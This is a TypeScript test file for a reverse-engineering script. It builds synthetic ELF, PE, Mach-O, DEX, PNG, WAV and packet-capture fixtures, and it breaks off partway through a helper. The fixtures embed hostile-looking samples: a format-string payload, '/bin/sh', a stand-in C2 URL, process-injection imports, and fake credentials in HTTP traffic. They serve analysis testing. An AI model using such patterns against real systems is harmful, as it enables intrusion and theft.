import { spawn, spawnSync } from "node:child_process";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	statSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

const ENGAGE = fileURLToPath(new URL("../../../scripts/reverse-agent/repi-engage.mjs", import.meta.url));

function collectTmp(root: string): string[] {
	const out: string[] = [];
	for (const entry of readdirSync(root, { withFileTypes: true })) {
		const path = join(root, entry.name);
		if (entry.name.endsWith(".tmp")) out.push(path);
		if (entry.isDirectory()) out.push(...collectTmp(path));
	}
	return out;
}

function jwtPart(value: unknown): string {
	return Buffer.from(JSON.stringify(value))
		.toString("base64")
		.replace(/=/g, "")
		.replace(/\+/g, "-")
		.replace(/\//g, "_");
}

function unsignedJwt(header: Record<string, unknown>, payload: Record<string, unknown>): string {
	return `${jwtPart(header)}.${jwtPart(payload)}.signaturepart`;
}

function minimalTcpPcap(): Buffer {
	const globalHeader = Buffer.alloc(24);
	globalHeader.writeUInt32LE(0xa1b2c3d4, 0);
	globalHeader.writeUInt16LE(2, 4);
	globalHeader.writeUInt16LE(4, 6);
	globalHeader.writeUInt32LE(0, 8);
	globalHeader.writeUInt32LE(0, 12);
	globalHeader.writeUInt32LE(65535, 16);
	globalHeader.writeUInt32LE(1, 20);

	const frame = Buffer.alloc(14 + 20 + 20);
	Buffer.from("00112233445566778899aabb0800", "hex").copy(frame, 0);
	frame[14] = 0x45;
	frame[15] = 0;
	frame.writeUInt16BE(40, 16);
	frame.writeUInt16BE(1, 18);
	frame.writeUInt16BE(0, 20);
	frame[22] = 64;
	frame[23] = 6;
	frame.writeUInt16BE(0, 24);
	Buffer.from([10, 0, 0, 1]).copy(frame, 26);
	Buffer.from([10, 0, 0, 2]).copy(frame, 30);
	frame.writeUInt16BE(12345, 34);
	frame.writeUInt16BE(80, 36);
	frame.writeUInt32BE(1, 38);
	frame.writeUInt32BE(0, 42);
	frame[46] = 0x50;
	frame[47] = 0x02;
	frame.writeUInt16BE(8192, 48);

	const packetHeader = Buffer.alloc(16);
	packetHeader.writeUInt32LE(1, 0);
	packetHeader.writeUInt32LE(0, 4);
	packetHeader.writeUInt32LE(frame.length, 8);
	packetHeader.writeUInt32LE(frame.length, 12);
	return Buffer.concat([globalHeader, packetHeader, frame]);
}

function minimalElf64Hardening(): Buffer {
	const buffer = Buffer.alloc(0x900);
	Buffer.from([0x7f, 0x45, 0x4c, 0x46]).copy(buffer, 0);
	buffer[4] = 2;
	buffer[5] = 1;
	buffer[6] = 1;
	buffer.writeUInt16LE(3, 16);
	buffer.writeUInt16LE(62, 18);
	buffer.writeUInt32LE(1, 20);
	buffer.writeBigUInt64LE(0x401000n, 24);
	buffer.writeBigUInt64LE(64n, 32);
	buffer.writeBigUInt64LE(0n, 40);
	buffer.writeUInt16LE(64, 52);
	buffer.writeUInt16LE(56, 54);
	buffer.writeUInt16LE(4, 56);

	const loadHeader = 64;
	buffer.writeUInt32LE(1, loadHeader);
	buffer.writeUInt32LE(5, loadHeader + 4);
	buffer.writeBigUInt64LE(0n, loadHeader + 8);
	buffer.writeBigUInt64LE(0x400000n, loadHeader + 16);
	buffer.writeBigUInt64LE(0x400000n, loadHeader + 24);
	buffer.writeBigUInt64LE(BigInt(buffer.length), loadHeader + 32);
	buffer.writeBigUInt64LE(BigInt(buffer.length), loadHeader + 40);
	buffer.writeBigUInt64LE(0x1000n, loadHeader + 48);

	const stackHeader = 64 + 56;
	buffer.writeUInt32LE(0x6474e551, stackHeader);
	buffer.writeUInt32LE(6, stackHeader + 4);

	const relroHeader = 64 + 56 * 2;
	buffer.writeUInt32LE(0x6474e552, relroHeader);
	buffer.writeUInt32LE(4, relroHeader + 4);
	buffer.writeBigUInt64LE(0x350n, relroHeader + 8);
	buffer.writeBigUInt64LE(0x400350n, relroHeader + 16);
	buffer.writeBigUInt64LE(0x400350n, relroHeader + 24);
	buffer.writeBigUInt64LE(0x30n, relroHeader + 32);
	buffer.writeBigUInt64LE(0x30n, relroHeader + 40);

	const dynamicHeader = 64 + 56 * 3;
	buffer.writeUInt32LE(2, dynamicHeader);
	buffer.writeUInt32LE(6, dynamicHeader + 4);
	buffer.writeBigUInt64LE(0x500n, dynamicHeader + 8);
	buffer.writeBigUInt64LE(0x400500n, dynamicHeader + 16);
	buffer.writeBigUInt64LE(0x400500n, dynamicHeader + 24);
	buffer.writeBigUInt64LE(16n * 13n, dynamicHeader + 32);
	buffer.writeBigUInt64LE(16n * 13n, dynamicHeader + 40);
	buffer.writeBigUInt64LE(8n, dynamicHeader + 48);

	const dynamicNames = ["libc.so.6", "__stack_chk_fail", "__printf_chk", "gets", "system", "puts"];
	const stringOffsets = new Map<string, number>();
	let stringCursor = 1;
	for (const name of dynamicNames) {
		stringOffsets.set(name, stringCursor);
		stringCursor += Buffer.byteLength(name, "utf8") + 1;
	}
	const dynstr = Buffer.alloc(stringCursor);
	for (const name of dynamicNames) Buffer.from(`${name}\0`, "utf8").copy(dynstr, stringOffsets.get(name) ?? 0);
	dynstr.copy(buffer, 0x200);
	const symbolNames = ["gets", "system", "__stack_chk_fail", "__printf_chk", "puts"];
	buffer.writeUInt32LE(1, 0x260);
	buffer.writeUInt32LE(symbolNames.length + 1, 0x264);
	const writeSymbol = (index: number, name: string) => {
		const offset = 0x2a0 + index * 24;
		buffer.writeUInt32LE(stringOffsets.get(name) ?? 0, offset);
		buffer[offset + 4] = 0x12;
		buffer[offset + 5] = 0;
		buffer.writeUInt16LE(0, offset + 6);
		buffer.writeBigUInt64LE(0n, offset + 8);
		buffer.writeBigUInt64LE(0n, offset + 16);
	};
	for (const [index, name] of symbolNames.entries()) writeSymbol(index + 1, name);
	const writeRela = (index: number, gotOffset: bigint, symbolIndex: number) => {
		const offset = 0x340 + index * 24;
		buffer.writeBigUInt64LE(gotOffset, offset);
		buffer.writeBigUInt64LE((BigInt(symbolIndex) << 32n) | 7n, offset + 8);
		buffer.writeBigInt64LE(0n, offset + 16);
	};
	writeRela(0, 0x404000n, 1);
	writeRela(1, 0x404008n, 2);
	Buffer.from([0x5f, 0xc3, 0x5e, 0xc3, 0x5a, 0xc3, 0x58, 0xc3, 0x0f, 0x05, 0xc3, 0xc9, 0xc3]).copy(buffer, 0x640);
	Buffer.from("gets\0system\0AAAA %n %p\0/bin/sh\0http://c2.example/p\0base64 xor\0flag{demo}\0", "utf8").copy(
		buffer,
		0x700,
	);
	const dynamicEntry = (index: number, tag: bigint, value: bigint) => {
		const offset = 0x500 + index * 16;
		buffer.writeBigUInt64LE(tag, offset);
		buffer.writeBigUInt64LE(value, offset + 8);
	};
	dynamicEntry(0, 1n, BigInt(stringOffsets.get("libc.so.6") ?? 1));
	dynamicEntry(1, 4n, 0x400260n);
	dynamicEntry(2, 5n, 0x400200n);
	dynamicEntry(3, 6n, 0x4002a0n);
	dynamicEntry(4, 10n, BigInt(dynstr.length));
	dynamicEntry(5, 11n, 24n);
	dynamicEntry(6, 2n, 48n);
	dynamicEntry(7, 20n, 7n);
	dynamicEntry(8, 23n, 0x400340n);
	dynamicEntry(9, 24n, 0n);
	dynamicEntry(10, 30n, 8n);
	dynamicEntry(11, 0x6ffffffbn, 1n);
	dynamicEntry(12, 0n, 0n);
	return buffer;
}

function minimalPe64ImportSample(): Buffer {
	const buffer = Buffer.alloc(0x800);
	Buffer.from("MZ").copy(buffer, 0);
	buffer.writeUInt32LE(0x80, 0x3c);
	Buffer.from("PE\0\0").copy(buffer, 0x80);
	const coff = 0x84;
	buffer.writeUInt16LE(0x8664, coff);
	buffer.writeUInt16LE(2, coff + 2);
	buffer.writeUInt32LE(0x5f3759df, coff + 4);
	buffer.writeUInt16LE(0xf0, coff + 16);
	buffer.writeUInt16LE(0x22, coff + 18);
	const optional = coff + 20;
	buffer.writeUInt16LE(0x20b, optional);
	buffer.writeUInt32LE(0x200, optional + 4);
	buffer.writeUInt32LE(0x1000, optional + 16);
	buffer.writeUInt32LE(0x1000, optional + 20);
	buffer.writeBigUInt64LE(0x140000000n, optional + 24);
	buffer.writeUInt32LE(0x1000, optional + 32);
	buffer.writeUInt32LE(0x200, optional + 36);
	buffer.writeUInt32LE(0x3000, optional + 56);
	buffer.writeUInt32LE(0x200, optional + 60);
	buffer.writeUInt16LE(3, optional + 68);
	buffer.writeUInt16LE(0x40 | 0x100 | 0x4000 | 0x20, optional + 70);
	buffer.writeUInt32LE(16, optional + 108);
	const dataDirectory = optional + 112;
	buffer.writeUInt32LE(0x2000, dataDirectory + 8);
	buffer.writeUInt32LE(0x100, dataDirectory + 12);

	const textSection = optional + 0xf0;
	Buffer.from(".text\0\0\0").copy(buffer, textSection);
	buffer.writeUInt32LE(0x100, textSection + 8);
	buffer.writeUInt32LE(0x1000, textSection + 12);
	buffer.writeUInt32LE(0x200, textSection + 16);
	buffer.writeUInt32LE(0x200, textSection + 20);
	buffer.writeUInt32LE(0x60000020, textSection + 36);

	const rdataSection = textSection + 40;
	Buffer.from(".rdata\0\0").copy(buffer, rdataSection);
	buffer.writeUInt32LE(0x300, rdataSection + 8);
	buffer.writeUInt32LE(0x2000, rdataSection + 12);
	buffer.writeUInt32LE(0x400, rdataSection + 16);
	buffer.writeUInt32LE(0x400, rdataSection + 20);
	buffer.writeUInt32LE(0x40000040, rdataSection + 36);

	const importDescriptor = 0x400;
	buffer.writeUInt32LE(0x2050, importDescriptor);
	buffer.writeUInt32LE(0x2030, importDescriptor + 12);
	buffer.writeUInt32LE(0x2070, importDescriptor + 16);
	Buffer.from("KERNEL32.dll\0").copy(buffer, 0x430);
	buffer.writeBigUInt64LE(0x2090n, 0x450);
	buffer.writeBigUInt64LE(0x20a8n, 0x458);
	buffer.writeBigUInt64LE(0n, 0x460);
	buffer.writeBigUInt64LE(0x2090n, 0x470);
	buffer.writeBigUInt64LE(0x20a8n, 0x478);
	buffer.writeBigUInt64LE(0n, 0x480);
	buffer.writeUInt16LE(0, 0x490);
	Buffer.from("VirtualAlloc\0").copy(buffer, 0x492);
	buffer.writeUInt16LE(0, 0x4a8);
	Buffer.from("CreateRemoteThread\0").copy(buffer, 0x4aa);
	return buffer;
}

function minimalMachO64(): Buffer {
	const headerSize = 32;
	const segmentSize = 72 + 80;
	const dylibName = Buffer.from("/usr/lib/libSystem.B.dylib\0", "ascii");
	const dylibSize = Math.ceil((24 + dylibName.length) / 8) * 8;
	const rpathName = Buffer.from("@executable_path/Frameworks\0", "ascii");
	const rpathSize = Math.ceil((12 + rpathName.length) / 8) * 8;
	const symbolNames = [
		"_main",
		"_system",
		"_dlopen",
		"_objc_msgSend",
		"_SecTrustEvaluate",
		"_NSURLSession",
		"_$s4Demo6verifyyyF",
	];
	const stringOffsets = new Map<string, number>();
	let stringOffset = 1;
	for (const name of symbolNames) {
		stringOffsets.set(name, stringOffset);
		stringOffset += Buffer.byteLength(name, "utf8") + 1;
	}
	const stringTable = Buffer.alloc(stringOffset);
	for (const name of symbolNames) {
		Buffer.from(`${name}\0`, "utf8").copy(stringTable, stringOffsets.get(name) ?? 0);
	}
	const symtabCommandSize = 24;
	const symbolEntrySize = 16;
	const commandsSize = segmentSize + dylibSize + symtabCommandSize + 16 + 24 + 24 + rpathSize;
	const textOffset = headerSize + commandsSize;
	const symtabOffset = textOffset + 16;
	const strtabOffset = symtabOffset + symbolNames.length * symbolEntrySize;
	const codeSigOffset = strtabOffset + stringTable.length;
	const buffer = Buffer.alloc(codeSigOffset + 32);

	buffer.writeUInt32LE(0xfeedfacf, 0);
	buffer.writeInt32LE(0x01000007, 4);
	buffer.writeInt32LE(3, 8);
	buffer.writeUInt32LE(2, 12);
	buffer.writeUInt32LE(7, 16);
	buffer.writeUInt32LE(commandsSize, 20);
	buffer.writeUInt32LE(0x200000, 24);

	let offset = headerSize;

	buffer.writeUInt32LE(0x19, offset);
	buffer.writeUInt32LE(segmentSize, offset + 4);
	Buffer.from("__TEXT\0", "ascii").copy(buffer, offset + 8);
	buffer.writeBigUInt64LE(0x100000000n, offset + 24);
	buffer.writeBigUInt64LE(0x1000n, offset + 32);
	buffer.writeBigUInt64LE(BigInt(textOffset), offset + 40);
	buffer.writeBigUInt64LE(16n, offset + 48);
	buffer.writeUInt32LE(5, offset + 56);
	buffer.writeUInt32LE(5, offset + 60);
	buffer.writeUInt32LE(1, offset + 64);
	const section = offset + 72;
	Buffer.from("__text\0", "ascii").copy(buffer, section);
	Buffer.from("__TEXT\0", "ascii").copy(buffer, section + 16);
	buffer.writeBigUInt64LE(0x100000f00n, section + 32);
	buffer.writeBigUInt64LE(16n, section + 40);
	buffer.writeUInt32LE(textOffset, section + 48);
	offset += segmentSize;

	buffer.writeUInt32LE(0x0c, offset);
	buffer.writeUInt32LE(dylibSize, offset + 4);
	buffer.writeUInt32LE(24, offset + 8);
	dylibName.copy(buffer, offset + 24);
	offset += dylibSize;

	buffer.writeUInt32LE(0x02, offset);
	buffer.writeUInt32LE(symtabCommandSize, offset + 4);
	buffer.writeUInt32LE(symtabOffset, offset + 8);
	buffer.writeUInt32LE(symbolNames.length, offset + 12);
	buffer.writeUInt32LE(strtabOffset, offset + 16);
	buffer.writeUInt32LE(stringTable.length, offset + 20);
	offset += symtabCommandSize;

	buffer.writeUInt32LE(0x1d, offset);
	buffer.writeUInt32LE(16, offset + 4);
	buffer.writeUInt32LE(codeSigOffset, offset + 8);
	buffer.writeUInt32LE(32, offset + 12);
	offset += 16;

	buffer.writeUInt32LE((0x28 | 0x80000000) >>> 0, offset);
	buffer.writeUInt32LE(24, offset + 4);
	buffer.writeBigUInt64LE(0xf00n, offset + 8);
	offset += 24;

	buffer.writeUInt32LE(0x32, offset);
	buffer.writeUInt32LE(24, offset + 4);
	buffer.writeUInt32LE(1, offset + 8);
	buffer.writeUInt32LE(0x000d0000, offset + 12);
	buffer.writeUInt32LE(0x000e0000, offset + 16);
	offset += 24;

	buffer.writeUInt32LE((0x1c | 0x80000000) >>> 0, offset);
	buffer.writeUInt32LE(rpathSize, offset + 4);
	buffer.writeUInt32LE(12, offset + 8);
	rpathName.copy(buffer, offset + 12);

	Buffer.from([0x55, 0x48, 0x89, 0xe5, 0x31, 0xc0, 0x5d, 0xc3]).copy(buffer, textOffset);
	for (const [index, name] of symbolNames.entries()) {
		const symbolOffset = symtabOffset + index * symbolEntrySize;
		buffer.writeUInt32LE(stringOffsets.get(name) ?? 0, symbolOffset);
		buffer.writeUInt8(0x0f, symbolOffset + 4);
		buffer.writeUInt8(1, symbolOffset + 5);
		buffer.writeUInt16LE(0, symbolOffset + 6);
		buffer.writeBigUInt64LE(0x100000f00n + BigInt(index * 4), symbolOffset + 8);
	}
	stringTable.copy(buffer, strtabOffset);
	return buffer;
}

function minimalFatMachO64(): Buffer {
	const thin = minimalMachO64();
	const sliceOffset = 0x100;
	const buffer = Buffer.alloc(sliceOffset + thin.length);
	buffer.writeUInt32BE(0xcafebabe, 0);
	buffer.writeUInt32BE(1, 4);
	buffer.writeInt32BE(0x01000007, 8);
	buffer.writeInt32BE(3, 12);
	buffer.writeUInt32BE(sliceOffset, 16);
	buffer.writeUInt32BE(thin.length, 20);
	buffer.writeUInt32BE(2, 24);
	thin.copy(buffer, sliceOffset);
	return buffer;
}

function minimalZip(entries: Array<{ name: string; data: Buffer | string }>): Buffer {
	const localParts: Buffer[] = [];
	const centralParts: Buffer[] = [];
	let offset = 0;
	for (const entry of entries) {
		const name = Buffer.from(entry.name, "utf8");
		const data = Buffer.isBuffer(entry.data) ? entry.data : Buffer.from(entry.data, "utf8");
		const local = Buffer.alloc(30 + name.length + data.length);
		local.writeUInt32LE(0x04034b50, 0);
		local.writeUInt16LE(20, 4);
		local.writeUInt16LE(0x800, 6);
		local.writeUInt16LE(0, 8);
		local.writeUInt32LE(0, 10);
		local.writeUInt32LE(0, 14);
		local.writeUInt32LE(data.length, 18);
		local.writeUInt32LE(data.length, 22);
		local.writeUInt16LE(name.length, 26);
		local.writeUInt16LE(0, 28);
		name.copy(local, 30);
		data.copy(local, 30 + name.length);
		localParts.push(local);

		const central = Buffer.alloc(46 + name.length);
		central.writeUInt32LE(0x02014b50, 0);
		central.writeUInt16LE(20, 4);
		central.writeUInt16LE(20, 6);
		central.writeUInt16LE(0x800, 8);
		central.writeUInt16LE(0, 10);
		central.writeUInt32LE(0, 12);
		central.writeUInt32LE(0, 16);
		central.writeUInt32LE(data.length, 20);
		central.writeUInt32LE(data.length, 24);
		central.writeUInt16LE(name.length, 28);
		central.writeUInt16LE(0, 30);
		central.writeUInt16LE(0, 32);
		central.writeUInt16LE(0, 34);
		central.writeUInt16LE(0, 36);
		central.writeUInt32LE(0, 38);
		central.writeUInt32LE(offset, 42);
		name.copy(central, 46);
		centralParts.push(central);
		offset += local.length;
	}
	const central = Buffer.concat(centralParts);
	const eocd = Buffer.alloc(22);
	eocd.writeUInt32LE(0x06054b50, 0);
	eocd.writeUInt16LE(0, 4);
	eocd.writeUInt16LE(0, 6);
	eocd.writeUInt16LE(entries.length, 8);
	eocd.writeUInt16LE(entries.length, 10);
	eocd.writeUInt32LE(central.length, 12);
	eocd.writeUInt32LE(offset, 16);
	eocd.writeUInt16LE(0, 20);
	return Buffer.concat([...localParts, central, eocd]);
}

function uleb128(value: number): Buffer {
	const bytes: number[] = [];
	let cursor = value >>> 0;
	do {
		let byte = cursor & 0x7f;
		cursor >>>= 7;
		if (cursor) byte |= 0x80;
		bytes.push(byte);
	} while (cursor);
	return Buffer.from(bytes);
}

function minimalDex(strings: string[]): Buffer {
	const stringDataParts = strings.map((value) => {
		const bytes = Buffer.from(value, "utf8");
		return Buffer.concat([uleb128(value.length), bytes, Buffer.from([0])]);
	});
	const headerSize = 0x70;
	const stringIdsOff = headerSize;
	const dataOff = stringIdsOff + strings.length * 4;
	const data = Buffer.concat(stringDataParts);
	const buffer = Buffer.alloc(dataOff + data.length);
	Buffer.from("dex\n035\0", "ascii").copy(buffer, 0);
	buffer.writeUInt32LE(buffer.length, 32);
	buffer.writeUInt32LE(headerSize, 36);
	buffer.writeUInt32LE(0x12345678, 40);
	buffer.writeUInt32LE(strings.length, 56);
	buffer.writeUInt32LE(stringIdsOff, 60);
	buffer.writeUInt32LE(1, 64);
	buffer.writeUInt32LE(0, 68);
	buffer.writeUInt32LE(1, 72);
	buffer.writeUInt32LE(0, 76);
	buffer.writeUInt32LE(1, 88);
	buffer.writeUInt32LE(0, 92);
	buffer.writeUInt32LE(1, 96);
	buffer.writeUInt32LE(0, 100);
	buffer.writeUInt32LE(data.length, 104);
	buffer.writeUInt32LE(dataOff, 108);
	let cursor = dataOff;
	for (let index = 0; index < stringDataParts.length; index++) {
		buffer.writeUInt32LE(cursor, stringIdsOff + index * 4);
		stringDataParts[index].copy(buffer, cursor);
		cursor += stringDataParts[index].length;
	}
	return buffer;
}

function pngChunk(type: string, data: Buffer): Buffer {
	const chunk = Buffer.alloc(12 + data.length);
	chunk.writeUInt32BE(data.length, 0);
	Buffer.from(type, "ascii").copy(chunk, 4);
	data.copy(chunk, 8);
	chunk.writeUInt32BE(0, 8 + data.length);
	return chunk;
}

function minimalPngWithStegoText(secret: string): Buffer {
	const ihdr = Buffer.alloc(13);
	ihdr.writeUInt32BE(1, 0);
	ihdr.writeUInt32BE(1, 4);
	ihdr[8] = 8;
	ihdr[9] = 6;
	const encodedChain = Buffer.from("flag{chain_demo}", "utf8").toString("base64");
	const text = Buffer.from(`Comment\0flag{demo} cipher nonce base64 encoded=${encodedChain} secret=${secret}`, "utf8");
	return Buffer.concat([
		Buffer.from("89504e470d0a1a0a", "hex"),
		pngChunk("IHDR", ihdr),
		pngChunk("tEXt", text),
		pngChunk("IDAT", Buffer.from([0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])),
		pngChunk("IEND", Buffer.alloc(0)),
		minimalZip([{ name: "hidden/flag.txt", data: "flag backup" }]),
	]);
}

function wavChunk(type: string, data: Buffer): Buffer {
	const padding = Buffer.alloc(data.length % 2);
	const chunk = Buffer.alloc(8 + data.length + padding.length);
	Buffer.from(type, "ascii").copy(chunk, 0);
	chunk.writeUInt32LE(data.length, 4);
	data.copy(chunk, 8);
	return chunk;
}

function minimalWavWithLsb(secret: string): Buffer {
	const fmt = Buffer.alloc(16);
	fmt.writeUInt16LE(1, 0);
	fmt.writeUInt16LE(1, 2);
	fmt.writeUInt32LE(8000, 4);
	fmt.writeUInt32LE(8000, 8);
	fmt.writeUInt16LE(1, 12);
	fmt.writeUInt16LE(8, 14);
	const infoText = Buffer.from(`cipher nonce secret=${secret}\0`, "utf8");
	const infoPayload = Buffer.concat([Buffer.from("INFO", "ascii"), wavChunk("ICMT", infoText)]);
	const hidden = Buffer.from("flag{wav_lsb_demo}", "ascii");
	const samples = Buffer.alloc(hidden.length * 8, 0x40);
	for (const [index, byte] of hidden.entries()) {
		for (let bit = 0; bit < 8; bit++) {
			samples[index * 8 + bit] |= (byte >> bit) & 1;
		}
	}
	const chunks = Buffer.concat([wavChunk("fmt ", fmt), wavChunk("LIST", infoPayload), wavChunk("data", samples)]);
	const header = Buffer.alloc(12);
	Buffer.from("RIFF", "ascii").copy(header, 0);
	header.writeUInt32LE(4 + chunks.length, 4);
	Buffer.from("WAVE", "ascii").copy(header, 8);
	return Buffer.concat([header, chunks, minimalZip([{ name: "wav-hidden/flag.txt", data: "flag backup" }])]);
}

function pcapngBlock(type: number, body: Buffer): Buffer {
	const padding = Buffer.alloc((4 - (body.length % 4)) % 4);
	const totalLength = 12 + body.length + padding.length;
	const block = Buffer.alloc(totalLength);
	block.writeUInt32LE(type, 0);
	block.writeUInt32LE(totalLength, 4);
	body.copy(block, 8);
	padding.copy(block, 8 + body.length);
	block.writeUInt32LE(totalLength, totalLength - 4);
	return block;
}

function ethernetIpv4TcpFrame(payload: Buffer, sport = 45678, dport = 80, seq = 1): Buffer {
	const frame = Buffer.alloc(14 + 20 + 20 + payload.length);
	Buffer.from("00112233445566778899aabb0800", "hex").copy(frame, 0);
	const ipStart = 14;
	frame[ipStart] = 0x45;
	frame[ipStart + 1] = 0;
	frame.writeUInt16BE(20 + 20 + payload.length, ipStart + 2);
	frame.writeUInt16BE(2, ipStart + 4);
	frame.writeUInt16BE(0, ipStart + 6);
	frame[ipStart + 8] = 64;
	frame[ipStart + 9] = 6;
	frame.writeUInt16BE(0, ipStart + 10);
	Buffer.from([10, 0, 0, 10]).copy(frame, ipStart + 12);
	Buffer.from([10, 0, 0, 20]).copy(frame, ipStart + 16);
	const tcpStart = ipStart + 20;
	frame.writeUInt16BE(sport, tcpStart);
	frame.writeUInt16BE(dport, tcpStart + 2);
	frame.writeUInt32BE(seq, tcpStart + 4);
	frame.writeUInt32BE(0, tcpStart + 8);
	frame[tcpStart + 12] = 0x50;
	frame[tcpStart + 13] = 0x18;
	frame.writeUInt16BE(8192, tcpStart + 14);
	payload.copy(frame, tcpStart + 20);
	return frame;
}

function tlsClientHelloPayload(serverName: string, protocols = ["h2", "http/1.1"]): Buffer {
	const writeU24 = (value: number) => Buffer.from([(value >> 16) & 0xff, (value >> 8) & 0xff, value & 0xff]);
	const serverNameBytes = Buffer.from(serverName, "ascii");
	const serverNameEntry = Buffer.alloc(3 + serverNameBytes.length);
	serverNameEntry[0] = 0;
	serverNameEntry.writeUInt16BE(serverNameBytes.length, 1);
	serverNameBytes.copy(serverNameEntry, 3);
	const serverNameList = Buffer.alloc(2 + serverNameEntry.length);
	serverNameList.writeUInt16BE(serverNameEntry.length, 0);
	serverNameEntry.copy(serverNameList, 2);
	const sniExtension = Buffer.alloc(4 + serverNameList.length);
	sniExtension.writeUInt16BE(0x0000, 0);
	sniExtension.writeUInt16BE(serverNameList.length, 2);
	serverNameList.copy(sniExtension, 4);
	const supportedGroupsBody = Buffer.from([0x00, 0x04, 0x00, 0x1d, 0x00, 0x17]);
	const supportedGroupsExtension = Buffer.alloc(4 + supportedGroupsBody.length);
	supportedGroupsExtension.writeUInt16BE(0x000a, 0);
	supportedGroupsExtension.writeUInt16BE(supportedGroupsBody.length, 2);
	supportedGroupsBody.copy(supportedGroupsExtension, 4);
	const ecPointFormatsBody = Buffer.from([0x01, 0x00]);
	const ecPointFormatsExtension = Buffer.alloc(4 + ecPointFormatsBody.length);
	ecPointFormatsExtension.writeUInt16BE(0x000b, 0);
	ecPointFormatsExtension.writeUInt16BE(ecPointFormatsBody.length, 2);
	ecPointFormatsBody.copy(ecPointFormatsExtension, 4);
	const protocolList = Buffer.concat(
		protocols.map((protocol) => {
			const bytes = Buffer.from(protocol, "ascii");
			return Buffer.concat([Buffer.from([bytes.length]), bytes]);
		}),
	);
	const alpnBody = Buffer.alloc(2 + protocolList.length);
	alpnBody.writeUInt16BE(protocolList.length, 0);
	protocolList.copy(alpnBody, 2);
	const alpnExtension = Buffer.alloc(4 + alpnBody.length);
	alpnExtension.writeUInt16BE(0x0010, 0);
	alpnExtension.writeUInt16BE(alpnBody.length, 2);
	alpnBody.copy(alpnExtension, 4);
	const extensions = Buffer.concat([sniExtension, supportedGroupsExtension, ecPointFormatsExtension, alpnExtension]);
	const helloBody = Buffer.concat([
		Buffer.from([0x03, 0x03]),
		Buffer.alloc(32, 0x42),
		Buffer.from([0x00]),
		Buffer.from([0x00, 0x02, 0x13, 0x01]),
		Buffer.from([0x01, 0x00]),
		Buffer.from([(extensions.length >> 8) & 0xff, extensions.length & 0xff]),
		extensions,
	]);
	const handshake = Buffer.concat([Buffer.from([0x01]), writeU24(helloBody.length), helloBody]);
	const record = Buffer.alloc(5 + handshake.length);
	record[0] = 0x16;
	record[1] = 0x03;
	record[2] = 0x01;
	record.writeUInt16BE(handshake.length, 3);
	handshake.copy(record, 5);
	return record;
}

function dnsQueryPayload(name: string): Buffer {
	const labels = Buffer.concat(
		name.split(".").map((label) => Buffer.concat([Buffer.from([label.length]), Buffer.from(label, "ascii")])),
	);
	const header = Buffer.alloc(12);
	header.writeUInt16BE(0x1234, 0);
	header.writeUInt16BE(0x0100, 2);
	header.writeUInt16BE(1, 4);
	const question = Buffer.alloc(labels.length + 5);
	labels.copy(question, 0);
	question[labels.length] = 0;
	question.writeUInt16BE(1, labels.length + 1);
	question.writeUInt16BE(1, labels.length + 3);
	return Buffer.concat([header, question]);
}

function dnsResponsePayload(name: string, address: [number, number, number, number]): Buffer {
	const query = dnsQueryPayload(name);
	const header = Buffer.from(query.subarray(0, 12));
	header.writeUInt16BE(0x8180, 2);
	header.writeUInt16BE(1, 6);
	const answer = Buffer.alloc(16);
	answer.writeUInt16BE(0xc00c, 0);
	answer.writeUInt16BE(1, 2);
	answer.writeUInt16BE(1, 4);
	answer.writeUInt32BE(60, 6);
	answer.writeUInt16BE(4, 10);
	Buffer.from(address).copy(answer, 12);
	return Buffer.concat([header, query.subarray(12), answer]);
}

function ethernetIpv4UdpFrame(payload: Buffer, sport = 5353, dport = 53): Buffer {
	const frame = Buffer.alloc(14 + 20 + 8 + payload.length);
	Buffer.from("00112233445566778899aabb0800", "hex").copy(frame, 0);
	const ipStart = 14;
	frame[ipStart] = 0x45;
	frame[ipStart + 1] = 0;
	frame.writeUInt16BE(20 + 8 + payload.length, ipStart + 2);
	frame.writeUInt16BE(3, ipStart + 4);
	frame.writeUInt16BE(0, ipStart + 6);
	frame[ipStart + 8] = 64;
	frame[ipStart + 9] = 17;
	frame.writeUInt16BE(0, ipStart + 10);
	Buffer.from([10, 0, 0, 30]).copy(frame, ipStart + 12);
	Buffer.from([8, 8, 8, 8]).copy(frame, ipStart + 16);
	const udpStart = ipStart + 20;
	frame.writeUInt16BE(sport, udpStart);
	frame.writeUInt16BE(dport, udpStart + 2);
	frame.writeUInt16BE(8 + payload.length, udpStart + 4);
	frame.writeUInt16BE(0, udpStart + 6);
	payload.copy(frame, udpStart + 8);
	return frame;
}

function minimalPcapngHttpDns(): Buffer {
	const sectionBody = Buffer.alloc(16);
	sectionBody.writeUInt32LE(0x1a2b3c4d, 0);
	sectionBody.writeUInt16LE(1, 4);
	sectionBody.writeUInt16LE(0, 6);
	sectionBody.writeInt32LE(-1, 8);
	sectionBody.writeInt32LE(-1, 12);
	const idbBody = Buffer.alloc(8);
	idbBody.writeUInt16LE(1, 0);
	idbBody.writeUInt16LE(0, 2);
	idbBody.writeUInt32LE(65535, 4);
	const enhancedPacket = (packet: Buffer) => {
		const body = Buffer.alloc(20 + packet.length);
		body.writeUInt32LE(0, 0);
		body.writeUInt32LE(0, 4);
		body.writeUInt32LE(1, 8);
		body.writeUInt32LE(packet.length, 12);
		body.writeUInt32LE(packet.length, 16);
		packet.copy(body, 20);
		return pcapngBlock(6, body);
	};
	const body = "username=alice&password=superSecretTokenValue&csrf_token=superSecretTokenValue";
	const basic = Buffer.from("alice:superSecretTokenValue").toString("base64");
	const http = ethernetIpv4TcpFrame(
		Buffer.from(
			[
				"POST /api/orders?access_token=superSecretTokenValue HTTP/1.1",
				"Host: example.local",
				`Authorization: Basic ${basic}`,
				"Cookie: sid=superSecretTokenValue; theme=light",
				"Content-Type: application/x-www-form-urlencoded",
				"User-Agent: repi-test",
				`Content-Length: ${Buffer.byteLength(body)}`,
				"",
				body,
			].join("\r\n"),
		),
	);
	const httpResponse = ethernetIpv4TcpFrame(
		Buffer.from(
			[
				"HTTP/1.1 302 Found",
				"Server: repi-test",
				"Set-Cookie: session=superSecretTokenValue; HttpOnly; Secure",
				"Location: /next?token=superSecretTokenValue",
				"Content-Type: text/html",
				"",
				"<html></html>",
			].join("\r\n"),
		),
		80,
		45678,
	);
	const dns = ethernetIpv4UdpFrame(dnsQueryPayload("example.com"));
